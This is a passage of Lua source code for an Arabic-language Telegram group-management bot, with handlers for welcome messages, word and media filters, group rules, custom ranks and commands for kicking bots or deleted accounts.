GetWelcome = GetWelcomeGroup
else 
GetWelcome = '* ⊀︰ مـمسويـن تࢪحيـب عمـري*'
end 
send(msg.chat_id_, msg.id_,'['..GetWelcome..']') 
return false  
end
if text == 'تفعيل الترحيب' and Mod(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:set(bot_id..'Chek:Welcome'..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_,'* ⊀︰ تـم حذفـت ترحيـب بࢪو*') 
return false  
end
if text == 'تعطيل الترحيب' and Mod(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:del(bot_id..'Chek:Welcome'..msg.chat_id_) 
send(msg.chat_id_, msg.id_,'* ⊀︰ تم تعطيل ترحيب الكروب*') 
return false  
end
if text == 'مسح الترحيب' or text == 'حذف الترحيب' then 
if Mod(msg) then
database:del(bot_id..'Get:Welcome:Group'..msg.chat_id_) 
send(msg.chat_id_, msg.id_,'* ⊀︰ تـم ازاله التࢪحيـب بـرو..🕸️*') 
end
end
if text and text == "منع" and msg.reply_to_message_id_ == 0 and Manager(msg)  then       
send(msg.chat_id_, msg.id_,"* ⊀︰ ارسل الكلمه لمنعها*")  
database:set(bot_id.."RiNdA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."RiNdA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_,"* ⊀︰ ارسل التحذير عند ارسال الكلمه*")  
database:set(bot_id.."RiNdA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."RiNdA1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."RiNdA1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."RiNdA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_,"* ⊀︰ تم منع الكلمه مع التحذير*")  
database:del(bot_id.."RiNdA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."RiNdA1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."RiNdA1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."RiNdA1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_,"* ⊀︰ ارسل الكلمه الان*")  
database:set(bot_id.."RiNdA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."RiNdA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test and test == "reppp" then   
send(msg.chat_id_, msg.id_,"* ⊀︰ تم الغاء منعها*")  
database:del(bot_id.."RiNdA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."RiNdA1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."RiNdA1:List:Filter"..msg.chat_id_,text)  
return false  end  
end


if text == 'منع' and tonumber(msg.reply_to_message_id_) > 0 and Manager(msg) then     
function cb(a,b,c) 
textt = ' ⊀︰ تم منع '
if b.content_.sticker_ then
local idsticker = b.content_.sticker_.set_id_
database:sadd(bot_id.."filtersteckr"..msg.chat_id_,idsticker)
text = 'الملصق'
send(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح لن يتم ارسالها مجددا')  
return false
end
if b.content_.ID == "MessagePhoto" then
local photo = b.content_.photo_.id_
database:sadd(bot_id.."filterphoto"..msg.chat_id_,photo)
text = 'الصوره'
send(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح لن يتم ارسالها مجددا')  
return false
end
if b.content_.animation_.animation_ then
local idanimation = b.content_.animation_.animation_.persistent_id_
database:sadd(bot_id.."filteranimation"..msg.chat_id_,idanimation)
text = 'المتحركه'
send(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح لن يتم ارسالها مجددا')  
return false
end
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, cb, nil)
end
if text == 'الغاء منع' and tonumber(msg.reply_to_message_id_) > 0 and Manager(msg) then     
function cb(a,b,c) 
textt = ' ⊀︰ تم الغاء منع '
if b.content_.sticker_ then
local idsticker = b.content_.sticker_.set_id_
database:srem(bot_id.."filtersteckr"..msg.chat_id_,idsticker)
text = 'الملصق'
send(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح يمكنهم الارسال الان')  
return false
end
if b.content_.ID == "MessagePhoto" then
local photo = b.content_.photo_.id_
database:srem(bot_id.."filterphoto"..msg.chat_id_,photo)
text = 'الصوره'
send(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح يمكنهم الارسال الان')  
return false
end
if b.content_.animation_.animation_ then
local idanimation = b.content_.animation_.animation_.persistent_id_
database:srem(bot_id.."filteranimation"..msg.chat_id_,idanimation)
text = 'المتحركه'
send(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح يمكنهم الارسال الان')  
return false
end
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, cb, nil)
end

if text == "مسح قائمه المنع"and Manager(msg) then   
local list = database:smembers(bot_id.."RiNdA1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."RiNdA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."RiNdA1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."RiNdA1:List:Filter"..msg.chat_id_,v)  
end  
send(msg.chat_id_, msg.id_," ⊀︰ تم مسح قائمه المنع")  
end

if text == "قائمه المنع" and Manager(msg) then   
local list = database:smembers(bot_id.."RiNdA1:List:Filter"..msg.chat_id_)  
t = "\n ⊀︰ قائمة المنع \n●━━━━𝐑𝐀━━━━●\n"
for k,v in pairs(list) do  
local RiNdA_Msg = database:get(bot_id.."RiNdA1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." > {"..RiNdA_Msg.."}\n"    
end  
if #list == 0 then  
t = " ⊀︰ لا يوجد كلمات ممنوعه"  
end  
send(msg.chat_id_, msg.id_,t)  
end  

if text == 'مسح قائمه منع المتحركات' and Manager(msg) then     
database:del(bot_id.."filteranimation"..msg.chat_id_)
send(msg.chat_id_, msg.id_,' ⊀︰ تم مسح قائمه منع المتحركات')  
end
if text == 'مسح قائمه منع الصور' and Manager(msg) then     
database:del(bot_id.."filterphoto"..msg.chat_id_)
send(msg.chat_id_, msg.id_,' ⊀︰ تم مسح قائمه منع الصور')  
end
if text == 'مسح قائمه منع الملصقات' and Manager(msg) then     
database:del(bot_id.."filtersteckr"..msg.chat_id_)
send(msg.chat_id_, msg.id_,' ⊀︰ تم مسح قائمه منع الملصقات')  
end
------------------
if text == 'مسح كليشه المطور' and Devmode(msg) then
database:del(bot_id..'TEXT_SUDO')
send(msg.chat_id_, msg.id_,' ⊀︰ تم مسح كليشه المطور')
end
if text == 'ضع كليشه المطور' and Devmode(msg) then
database:set(bot_id..'Set:TEXT_SUDO'..msg.chat_id_..':'..msg.sender_user_id_,true)
send(msg.chat_id_,msg.id_,' ⊀︰ ارسل الكليشه الان')
return false
end
if text and database:get(bot_id..'Set:TEXT_SUDO'..msg.chat_id_..':'..msg.sender_user_id_) then
if text == 'الغاء' then 
database:del(bot_id..'Set:TEXT_SUDO'..msg.chat_id_..':'..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,' ⊀︰ تم الغاء حفظ كليشة المطور')
return false
end
database:set(bot_id..'TEXT_SUDO',text)
database:del(bot_id..'Set:TEXT_SUDO'..msg.chat_id_..':'..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,' ⊀︰ تم حفظ كليشة المطور')
return false
end
-----------------
if text == 'تعين الايدي' and Manager(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:setex(bot_id.."CHENG:ID"..msg.chat_id_..""..msg.sender_user_id_,240,true)  
local Text= [[
⊀︰ اࢪسـل كلـيشه الايـدي ..🦇
 ⊀︰ تـڪدࢪ تضـيف من هذني الاوامࢪ جوه وتࢪتـب
 ⊀︰ واذا مالڪ خلڪ اڪـتب تغـيࢪ الايدي وطز بلخلييۿ
🥤⌯↬`#rdphoto` ↫ تعلـيق الصـوࢪه
🥤⌯↬`#username` ↫ اسـمك
🥤⌯↬`#msgs` ↫ عـدد ࢪسـائل
🥤⌯↬`#photos` ↫ عدد صـوࢪ
🥤⌯↬`#id` ↫ ايـديك
🥤⌯↬`#auto` ↫ تفاعل 
🥤⌯↬`#stast` ↫ موقع  
🥤⌯↬`#edit` ↫ السحكات
🥤⌯↬`#game` ↫ النقاط
]]
send(msg.chat_id_, msg.id_,Text)
return false  
end 
if text == 'حذف الايدي' or text == 'مسح الايدي' then
if Manager(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:del(bot_id.."KLISH:ID"..msg.chat_id_)
send(msg.chat_id_, msg.id_, '* ⊀︰ تم ازالة كليشة الايدي*')
end
return false  
end 

if database:get(bot_id.."CHENG:ID"..msg.chat_id_..""..msg.sender_user_id_) then 
if text == 'الغاء' then 
send(msg.chat_id_, msg.id_,"* ⊀︰ تم الغاء تعين الايدي*") 
database:del(bot_id.."CHENG:ID"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
database:del(bot_id.."CHENG:ID"..msg.chat_id_..""..msg.sender_user_id_) 
local CHENGER_ID = text:match("(.*)")  
database:set(bot_id.."KLISH:ID"..msg.chat_id_,CHENGER_ID)
send(msg.chat_id_, msg.id_,'* ⊀︰ تم تعين الايدي*')    
end

if text == 'طرد البوتات' and Mod(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
tdcli_function ({ ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID,filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,tah)  
local admins = tah.members_  
local x = 0
local c = 0
for i=0 , #admins do 
if tah.members_[i].status_.ID == "ChatMemberStatusEditor" then  
x = x + 1 
end
if tonumber(admins[i].user_id_) ~= tonumber(bot_id) then
chat_kick(msg.chat_id_,admins[i].user_id_)
end
c = c + 1
end     
if (c - x) == 0 then
send(msg.chat_id_, msg.id_, "* ⊀︰ لا توجـد بوتـات فـي الكـࢪوب..🕸️*")
else
local t = ' ⊀︰ عـدد البوتات بكࢪوبك يكـيك >> {'..c..'}\n ⊀︰ عدد البوتات التي هي ادمن >> {'..x..'}\n ⊀︰ تم طرد >> {'..(c - x)..'} من البوتات'
send(msg.chat_id_, msg.id_,t) 
end 
end,nil)  
end   
end
if text == ("كشف البوتات") and Mod(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
tdcli_function ({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID,filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(extra,result,success)
local admins = result.members_  
text = "\n ⊀︰ قائمة البوتات الموجوده \n●━━━━𝐑𝐀━━━━●\n"
local n = 0
local t = 0
for i=0 , #admins do 
n = (n + 1)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_
},function(arg,ta) 
if result.members_[i].status_.ID == "ChatMemberStatusMember" then  
tr = ''
elseif result.members_[i].status_.ID == "ChatMemberStatusEditor" then  
t = t + 1
tr = ' {★}'
end
text = text..">> [@"..ta.username_..']'..tr.."\n"
if #admins == 0 then
send(msg.chat_id_, msg.id_, " ⊀︰ لا توجـد بوتـات فـي الكـࢪوب..🕸️")
return false 
end
if #admins == i then 
local a = '\n●━━━━𝐑𝐀━━━━●\n ⊀︰ عدد البوتات التي هنا >> {'..n..'} بوت\n'
local f = ' ⊀︰ عدد البوتات التي هي ادمن >> {'..t..'}\n ⊀︰ ملاحضه علامة ال (✯) تعني ان البوت ادمن \n'
send(msg.chat_id_, msg.id_, text..a..f)
end
end,nil)
end
end,nil)
end

if database:get(bot_id.."Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' then 
send(msg.chat_id_, msg.id_, "* ⊀︰ تم الغاء حفظ القوانين*") 
database:del(bot_id.."Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
return false  
end 
database:set(bot_id.."Set:Rules:Group" .. msg.chat_id_,text) 
send(msg.chat_id_, msg.id_,"* ⊀︰ تم حفظ قوانين الكروب*") 
database:del(bot_id.."Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
end  

if text == 'ضع قوانين' or text == 'خلي قوانين' then 
if Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:setex(bot_id.."Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_,msg.id_,"* ⊀︰ دز القوانـين يࢪوحي..*")  
end
end
if text == 'مسح القوانين' or text == 'حذف القوانين' then  
if Mod(msg) then
send(msg.chat_id_, msg.id_,"* ⊀︰ تـم شلت ڪليشه القوانـين..*")  
database:del(bot_id.."Set:Rules:Group"..msg.chat_id_) 
end
end
if text == 'القوانين' then 
local Set_Rules = database:get(bot_id.."Set:Rules:Group" .. msg.chat_id_)   
if Set_Rules then     
send(msg.chat_id_,msg.id_, Set_Rules)   
else      
send(msg.chat_id_, msg.id_,"* ⊀︰ ماڪو قوانين بلڪࢪوب بـࢪو..*")   
end    
end
if text == "كت" or text == "كت تويت" then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"*⊀︰  وين تحب تسافر*","*⊀︰  فنانك المفضل*","*⊀︰  اسمك الحقيقي نفسه اسمك بالتلي؟*","*⊀︰  تحب منوو*","*⊀︰  تتوقع روحك بالجنه لو بالنار؟*","*⊀︰  اكثر دكه ناقصه سويتها؟*","*⊀︰  تعرف شكد احبك؟*","*⊀︰  عيونك يالون؟*","*⊀︰  اسم التحبه/تحبي؟*","*⊀︰  هم تكره الشجر*","*⊀︰  تعرف رسو ؟*","*⊀︰  شنو سويت اخر شي؟*","*⊀︰  تدري انته كيك*","‏*⊀︰  ما هي الصفة التي تبتعد عن الآخرين بسببها . . . ؟*","*⊀︰  فكرة خاطئة منتشرة عند البنات ؟.*","*⊀︰  هل مدمن ع شي متكدر تتركه؟*","*⊀︰  طفولتك حلوه؟*","*⊀︰  اذا رجعلك الحب الاول تبقة تحبه نفس الحب؟*","*⊀︰  كم وجبه تاكل باليوم؟*","*⊀︰  تحصيلك الدراسي؟*","*⊀︰  اغنيه عندك بيها ذكريات؟*","*⊀︰  لو الحرام اصبح حلال ما اول شيئ تفعله؟*","*⊀︰  تحب شخص يكرهك؟*","*⊀︰  الصديق ام المال؟*","*⊀︰  وقت فرحك من أول شخص تكلمة.؟*","*⊀︰  منشن لشخص دكله اطلع من حياتي؟*","*⊀︰  لو اغمضت عيناك الان ماهوه الشيئ الذي ستفكر به ؟*","*⊀︰  شنو اسم امك؟*","*⊀︰  يوم تحبه؟*","*⊀︰  اغنيتك المفضله؟*","*⊀︰  تدخن ؟*","*⊀︰  تحب اهلك ؟*","*⊀︰  عمرك ؟*","*⊀︰  صفه تخليك تكره الشخص ؟*","*⊀︰  شكد جبت اعلى درجه بالمدرسه ؟*","*⊀︰  كم مره راسب ؟*","*⊀︰  شهر تحبه ؟*","*⊀︰  الصيف لو الشتاء ؟*","*⊀︰  مشهور تحبه ؟*","*⊀︰  اسم الي تحبه ؟*","*⊀︰  موقف محرج ؟*","*⊀︰  اكلتك المفضله ؟*","*⊀︰  ملسلسك المفضل؟*"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
if text == 'سد التفليش' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:set(bot_id..'lock:tagrvrbot'..msg.chat_id_,true)   
list ={"lock:Bot:kick","lock:user:name","lock:Link","lock:forward","lock:Sticker","lock:Animation","lock:Video","lock:Fshar","lock:Fars","Bot:Id:Photo","lock:Audio","lock:vico","lock:Document","lock:Unsupported","lock:Markdaun","lock:Contact","lock:Spam"}
for i,lock in pairs(list) do 
database:set(bot_id..lock..msg.chat_id_,'del')    
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ التـفليش بـࢪو*')  
end,nil)   
end
if text == 'افتح التفليش' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:del(bot_id..'lock:tagrvrbot'..msg.chat_id_)   
list ={"lock:Bot:kick","lock:user:name","lock:Link","lock:forward","lock:Sticker","lock:Animation","lock:Video","lock:Fshar","lock:Fars","Bot:Id:Photo","lock:Audio","lock:vico","lock:Document","lock:Unsupported","lock:Markdaun","lock:Contact","lock:Spam"}
for i,lock in pairs(list) do 
database:del(bot_id..lock..msg.chat_id_)    
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ تـم فـتح التفليش *')  
end,nil)   
end
if text == 'طرد المحذوفين' or text == 'مسح المحذوفين' then  
if Mod(msg) then    
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),offset_ = 0,limit_ = 1000}, function(arg,del)
for k, v in pairs(del.members_) do
tdcli_function({ID = "GetUser",user_id_ = v.user_id_},function(b,data) 
if data.first_name_ == false then
Group_Kick(msg.chat_id_, data.id_)
end
end,nil)
end
send(msg.chat_id_, msg.id_,'* ⊀︰ تم طرد المحذوفين*')
end,nil)
end
end
if text == 'الصلاحيات' and Mod(msg) then 
local list = database:smembers(bot_id..'Coomds'..msg.chat_id_)
if #list == 0 then
send(msg.chat_id_, msg.id_,'* ⊀︰ لا توجد صلاحيات مضافه*')
return false
end
t = "\n ⊀︰ قائمة الصلاحيات المضافه \n●━━━━𝐑𝐀━━━━●\n"
for k,v in pairs(list) do
var = database:get(bot_id.."Comd:New:rt:bot:"..v..msg.chat_id_)
if var then
t = t..''..k..'- '..v..' > ('..var..')\n'
else
t = t..''..k..'- '..v..'\n'
end
end
send(msg.chat_id_, msg.id_,t)
end
if text and text:match("^اضف صلاحيه (.*)$") and Mod(msg) then 
ComdNew = text:match("^اضف صلاحيه (.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:set(bot_id.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_,ComdNew)  
database:sadd(bot_id.."Coomds"..msg.chat_id_,ComdNew)  
database:setex(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_,200,true)  
send(msg.chat_id_, msg.id_, " ⊀︰ ارسل نوع الرتبه \n ⊀︰ {عـضـو -- ممـيـز -- ادمـن -- مـديـر}") 
end
if text and text:match("^مسح صلاحيه (.*)$") and Mod(msg) then 
ComdNew = text:match("^مسح صلاحيه (.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:del(bot_id.."Comd:New:rt:bot:"..ComdNew..msg.chat_id_)
send(msg.chat_id_, msg.id_, "* ⊀︰ تم مسح الصلاحيه *\n") 
end
if database:get(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_,"* ⊀︰ تم الغاء الامر *\n") 
database:del(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
if text == 'مدير' then
if not Constructor(msg) then
send(msg.chat_id_, msg.id_"* ⊀︰ تستطيع اضافه صلاحيات {ادمن - مميز - عضو} \n ⊀︰ ارسل الصلاحيه مجددا*\n") 
return false
end
end
if text == 'ادمن' then
if not Manager(msg) then 
send(msg.chat_id_, msg.id_,"* ⊀︰ تستطيع اضافه صلاحيات {مميز - عضو} \n ⊀︰ ارسل الصلاحيه مجددا*\n") 
return false
end
end
if text == 'مميز' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,"* ⊀︰ تستطيع اضافه صلاحيات {عضو} \n ⊀︰ ارسل الصلاحيه مجددا*\n") 
return false
end
end
if text == 'مدير' or text == 'ادمن' or text == 'مميز' or text == 'عضو' then
local textn = database:get(bot_id.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_)  
database:set(bot_id.."Comd:New:rt:bot:"..textn..msg.chat_id_,text)
send(msg.chat_id_, msg.id_, " ⊀︰ تـم اضـافـه الامـر") 
database:del(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
end
if text and text:match('ارفع (.*)') and tonumber(msg.reply_to_message_id_) > 0 and Mod(msg) then 
local RTPA = text:match('ارفع (.*)')
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:sismember(bot_id..'Coomds'..msg.chat_id_,RTPA) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local blakrt = database:get(bot_id.."Comd:New:rt:bot:"..RTPA..msg.chat_id_)
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'..'\n ⊀︰ تم ارفعه '..RTPA..'\n')   
database:set(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_,RTPA) 
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.sender_user_id_)  
elseif blakrt == 'ادمن' and Manager(msg) then 
send(msg.chat_id_, msg.id_,'\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'..'\n ⊀︰ تم ارفعه '..RTPA..'\n')   
database:set(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_,RTPA)
database:sadd(bot_id..'Mod:User'..msg.chat_id_,result.sender_user_id_)  
elseif blakrt == 'مدير' and Constructor(msg) then
send(msg.chat_id_, msg.id_,'\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'..'\n ⊀︰ تم ارفعه '..RTPA..'\n')   
database:set(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_,RTPA)  
database:sadd(bot_id..'Manager'..msg.chat_id_,result.sender_user_id_)  
elseif blakrt == 'عضو' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'..'\n ⊀︰ تم ارفعه '..RTPA..'\n')   
end
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match('نزل (.*)') and tonumber(msg.reply_to_message_id_) > 0 and Mod(msg) then 
local RTPA = text:match('نزل (.*)')
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:sismember(bot_id..'Coomds'..msg.chat_id_,RTPA) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local blakrt = database:get(bot_id.."Comd:New:rt:bot:"..RTPA..msg.chat_id_)
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'..'\n ⊀︰ م نزله من '..RTPA..'\n')   
database:srem(bot_id..'Special:User'..msg.chat_id_,result.sender_user_id_)  
database:del(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_)
elseif blakrt == 'ادمن' and Manager(msg) then 
send(msg.chat_id_, msg.id_,'\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'..'\n ⊀︰ تم نزله من '..RTPA..'\n')   
database:srem(bot_id..'Mod:User'..msg.chat_id_,result.sender_user_id_) 
database:del(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_)
elseif blakrt == 'مدير' and Constructor(msg) then
send(msg.chat_id_, msg.id_,'\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'..'\n ⊀︰ تم نزله من '..RTPA..'\n')   
database:srem(bot_id..'Manager'..msg.chat_id_,result.sender_user_id_)  
database:del(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_)
elseif blakrt == 'عضو' and Mod(msg) then
